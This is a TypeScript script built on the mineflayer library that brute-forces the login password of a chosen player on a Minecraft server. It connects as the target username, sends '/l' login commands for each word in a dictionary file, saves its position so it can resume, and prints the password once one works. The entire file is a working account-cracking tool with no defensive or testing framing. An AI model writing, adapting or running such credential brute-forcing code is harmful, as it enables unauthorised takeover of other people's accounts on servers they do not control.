import { Bot, ChatMessage, createBot } from "mineflayer";
import crypto from "crypto";
import { delay } from "q";
import { messageLoggedIn, messageLoginFailed, messageRegisterFailed, messageWaitForLogin, messageWaitForRegister } from "./constants";
import { Minecraft } from "./minecraft";
import { promises as fs } from "fs";
import { last, lastIndexOf } from "lodash";
import Logger from "bunyan";
import { MinecraftPool } from "./pool";

async function tryPassword(mc: Minecraft, password: string) {
	mc.bot.chat(`/l ${password}`);
	try {
		await mc.waitForMessage(messageLoggedIn, messageLoginFailed);
		return true;
	} catch (e) {
		return false;
	}
}

const targetUser = process.env.TARGET_USER;
const host = process.env.TARGET_HOST;
const port = process.env.TARGET_PORT ? parseInt(process.env.TARGET_PORT) : 25565;

async function runOnce() {
	let lastSequence = 0;
	try {
		lastSequence = JSON.parse(await fs.readFile("./data/last.json", "utf-8")).lastSequence;
		console.log(`Will start from ${lastSequence}.`);
	} catch (e) {
		console.log(`Will start from beginning.`);
	}
	const dict = (await fs.readFile("./dict.txt", "utf-8")).split("\n");
	console.log(`Starting crack user ${targetUser}`);
	const pool = new MinecraftPool(1, {
		username: targetUser,
		host,
		port
	});
	try {
		for (let i = lastSequence; i < dict.length; ++i) {
			const password = dict[i];
			await fs.writeFile("./data/last.json", JSON.stringify({ lastSequence: i }));
			const mc = await pool.pickOne();
			console.log(`Trying password ${password}`);
			if (await tryPassword(mc, password)) {
				console.log(`Success. Username: ${targetUser} Password: ${password}`);
				break;
			}
		}
	} catch (e) {
		console.log(`Failed: ${e.toString()}`);
	} finally {
		console.error(`Finished.`);
		process.exit();
	}
}
runOnce();
